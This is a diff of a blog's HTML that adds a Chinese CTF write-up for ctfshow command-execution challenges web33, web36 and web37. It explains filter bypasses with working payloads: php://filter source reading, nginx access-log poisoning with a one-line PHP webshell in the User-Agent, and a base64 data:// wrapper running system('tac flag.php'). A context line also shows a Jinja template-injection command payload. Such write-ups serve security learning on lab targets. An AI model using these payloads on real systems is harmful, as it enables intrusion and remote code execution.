@@ -71,6 +71,54 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-2026-08-04-ctfshow 命令执行web33" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2026/08/04/2026-08-04-ctfshow%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8Cweb33/" class="article-date">
+  <time class="dt-published" datetime="2026-08-04T00:00:00.000Z" itemprop="datePublished">2026-08-04</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2026/08/04/2026-08-04-ctfshow%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8Cweb33/">ctfshow 命令执行web33</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>题目来源：ctfshow 命令执行web33<br>题目链接(<a target="_blank" rel="noopener" href="https://d3626d15-ce3b-4230-a644-152156e284d3.challenge.ctf.show/">https://d3626d15-ce3b-4230-a644-152156e284d3.challenge.ctf.show/</a>)<br>题目描述：<br>解题思路：<br>启动靶机<br><img src="/images/Pastedimage20260803120502.png"><br>正则过滤了flag  system  php  cat  sort  shell  点号  空格  单引号  反引号  echo  分号  左括号  双引号<br>和上一题一样文件包含加日志注入</p>
+<h3 id="法1"><a href="#法1" class="headerlink" title="法1"></a>法1</h3><p><code>/?c=include%09$_GET[0]?&gt;&amp;0=php://filter/convert.base64-encode/resource=flag.php</code><br>整体执行过程<br>1.PHP将URL中的参数解析成 <code>$_GET</code> 数组<br>    <code>$_GET[&#39;c&#39;]</code> &#x3D; <code>&#39;include%09$_GET[0]?&gt;&#39;</code><br>    <code>$_GET[0]</code> &#x3D; <code>&#39;php://filter/convert.base64-encode/resource=flag.php&#39;</code><br> 2.<code>eval()</code> 执行 <code>c</code> 参数的内容<br>     <code>eval(&#39;include%09$_GET[0]?&gt;&#39;);</code><br>3.<code>$_GET[0]</code> 被替换成 flag.php   <code>include &#39;flag.php&#39;;</code><br>4.执行<code>include &#39;flag.php&#39;;</code><br><img src="/images/Pastedimage20260803114957.png"><br>base64解码<br><img src="/images/Pastedimage20260803115023.png"></p>
+<h3 id="法2"><a href="#法2" class="headerlink" title="法2"></a>法2</h3><p><img src="/images/Pastedimage20260803124048.png"><br>先抓包发现是nginx服务器 默认的access日志路径为<code>/var/log/nginx/access.log</code>access<br><code>/?c=include%09$_GET[0]?&gt;&amp;0=/var/log/nginx/access.log</code><br>整体执行过程<br>1.PHP将URL中的参数解析成 <code>$_GET</code> 数组<br>    <code>$_GET[&#39;c&#39;] = &#39;include%09$_GET[0]?&gt;&#39;;</code><br>    <code>$_GET[0] = &#39;/var/log/nginx/access.log&#39;;</code><br> 2.<code>eval()</code> 执行 <code>c</code> 参数的内容<br>     <code>eval(&#39;include%09$_GET[0]?&gt;&#39;);</code><br>3.<code>$_GET[0]</code> 被替换成 &#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log   <code>include &#39;/var/log/nginx/access.log&#39;;</code><br>4.执行<code>include &#39;/var/log/nginx/access.log&#39;;</code><br>抓包 将一句话木马写入UA<br><img src="/images/Pastedimage20260803120246.png"><br>蚁剑连接 得到flag<br><img src="/images/Pastedimage20260803120103.png"></p>
+<h1 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h1><p>题目来源：ctfshow 命令执行web36<br>题目链接(<a target="_blank" rel="noopener" href="https://861d637f-10bf-4798-9832-b206780f0a1c.challenge.ctf.show/">https://861d637f-10bf-4798-9832-b206780f0a1c.challenge.ctf.show/</a>)<br>题目描述：<br>解题思路：<br>启动靶机</p>
+<p><img src="/images/Pastedimage20260803122036.png"><br>在上一题的基础上 这里正则额外过滤了数字1-9</p>
+<h3 id="法1-1"><a href="#法1-1" class="headerlink" title="法1"></a>法1</h3><p>所以要在之前payload的基础上 将1修改为a<br>即<code>/?c=include%09$_GET[a]?&gt;&amp;a=php://filter/convert.base64-encode/resource=flag.php</code><br><img src="/images/Pastedimage20260803122212.png"><br>解码<br><img src="/images/Pastedimage20260803122240.png"></p>
+<h3 id="法2-1"><a href="#法2-1" class="headerlink" title="法2"></a>法2</h3><p><img src="/images/Pastedimage20260803123456.png"><br>还是先抓包发现是nginx服务器 默认的access日志路径为<code>/var/log/nginx/access.log</code>access<br>payload:<code>/?c=include%09$_GET[a]?&gt;&amp;a=/var/log/nginx/access.log</code><br>1.PHP将URL中的参数解析成 <code>$_GET</code> 数组<br>    <code>$_GET[&#39;c&#39;] = &#39;include%09$_GET[a]?&gt;&#39;;</code><br>    <code>$_GET[a] = &#39;/var/log/nginx/access.log&#39;;</code><br> 2.<code>eval()</code> 执行 <code>c</code> 参数的内容<br>     <code>eval(&#39;include%09$_GET[a]?&gt;&#39;);</code><br>3.<code>$_GET[a]</code> 被替换成 &#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log   <code>include &#39;/var/log/nginx/access.log&#39;;</code><br>4.执行<code>include &#39;/var/log/nginx/access.log&#39;;</code><br>抓包并将UA修改为一句话木马<br><img src="/images/Pastedimage20260803123101.png"><br>蚁剑连接<br><img src="/images/Pastedimage20260803123216.png"><br>得到flag</p>
+<h1 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h1><p>题目来源：ctfshow 命令执行web37<br>题目链接(<a target="_blank" rel="noopener" href="https://6978e87d-3d7f-4834-a227-a3520b13f37b.challenge.ctf.show/">https://6978e87d-3d7f-4834-a227-a3520b13f37b.challenge.ctf.show/</a>)<br>题目描述：<br>解题思路：<br>启动靶机<br><img src="/images/Pastedimage20260803125814.png"><br>正则过滤了flag不区分大小写<br>首先尝试<br><code>?c=include%0a$_GET[1]?&gt;&amp;1=php://filter/convert.base64-encode/resource=flag.php</code><br>没有响应<br>原因是：代码里没有任何eval，传进去的<code>include%0aGET[1]?&gt;</code>会被当作文件名来处理，而不是作为代码执行<br><strong>区别</strong><br><code>eval(c)</code>意思是把c参数的内容当作PHP代码来执行<br><code>include(c)</code>意思是把c参数的内容当作文件名来处理</p>
+<p>使用PHP伪协议<br>已知：<code>&lt;?php</code>表示开始PHP解析 <code>?&gt;</code>表示结束PHP解析 <code>&lt;?php system(&quot;tac flag.php&quot;) ?&gt;</code><br>在include包含时，被包含内容的PHP代码会被执行<br>所以读取flag文件的payload为：<code>data://text/plain,&lt;?php system(&quot;tac flag.php&quot;) ?&gt;</code><br>第一部分是协议头：data:&#x2F;&#x2F;  这是PHP的data伪协议标识，可以在字符串中嵌入数据，让文件函数读取这段字符串，告诉include要用data协议来处理后面的内容<br>第二部分是媒体类型：text&#x2F;plain  表示后面的数据是纯文本格式，告诉PHP如何解析这个数据流<br>第三部分是逗号  这是分隔符，用来分隔协议参数和实际数据内容<br>第四部分 <code>&lt;?php system(&quot;tac flag.php&quot;) ?&gt; </code>这是实际的数据内容，也就是要执行的PHP代码<br>但是由于flag被过滤 所以加一层base64编码<br><img src="/images/Pastedimage20260803132332.png"><br><code>/?c=data://text/plain;base64,PD9waHAgCnN5c3RlbSgidGFjIGZsYWcucGhwIikKPz4=</code><br>区别在于明文版本用逗号直接分隔，后面的内容原样传递<br>base64版本多了 <code>;base64</code>这个参数，告诉PHP后面的数据需要先base64解码再使用<br><img src="/images/Pastedimage20260803132656.png"><br>得到flag</p>
+<p>整个执行过程是绕过flag字符的过滤之后 PHP执行 include($c)，也就是 <code>include(&quot;data://text/plain;base64,PD9waHAgCnN5c3RlbSgidGFjIGZsYWcucGhwIikKPz4=&quot;)</code><br>include函数看到这个路径是以data:&#x2F;&#x2F;开头，就调用PHP的data协议处理器来处理这个路径<br>识别出协议类型是data   媒体类型是text&#x2F;plain  编码方式是base64<br>提取出要解码的数据是 <code>PD9waHAgCnN5c3RlbSgidGFjIGZsYWcucGhwIikKPz4=</code><br>data协议处理器把解码后的内容返回给include函数<br>include函数拿到这个内容后，发现是PHP代码，就开始执行它<br>system函数向操作系统shell发送命令 <code>&quot;tac flag.php&quot;</code><br>tac命令把读取到的flag.php内容返回给system函数<br>system函数把命令的输出直接打印到HTTP响应中</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://l-y-f-f1111.github.io/2026/08/04/2026-08-04-ctfshow%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8Cweb33/" data-id="cmsrc1va70004msuy719re188" data-title="ctfshow 命令执行web33" class="article-share-link"><span class="fa fa-share">分享</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
     <article id="post-2026-07-26-Untitled" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
     <a href="/2026/07/26/2026-07-26-Untitled/" class="article-date">
@@ -268,6 +316,10 @@ payload:`{% print(config.__class__.__init__.__globals__['os'].popen('cat /flag')
       <ul>
         
           <li>
+            <a href="/2026/08/15/2026-08-15-ctfshow%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8Cweb67/">ctfshow 命令执行web67</a>
+          </li>
+        
+          <li>
             <a href="/2026/08/14/2026-08-14-ctfshow%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8Cweb58/">ctfshow 命令执行web58</a>
           </li>
         
@@ -281,10 +333,6 @@ payload:`{% print(config.__class__.__init__.__globals__['os'].popen('cat /flag')
         
           <li>
             <a href="/2026/08/11/2026-08-11-ctfshow%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8Cweb52/">ctfshow 命令执行web52</a>
-          </li>
-        
-          <li>
-            <a href="/2026/08/10/2026-08-10-ctfshow%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8Cweb50/">ctfshow 命令执行web50</a>
           </li>
         
       </ul>
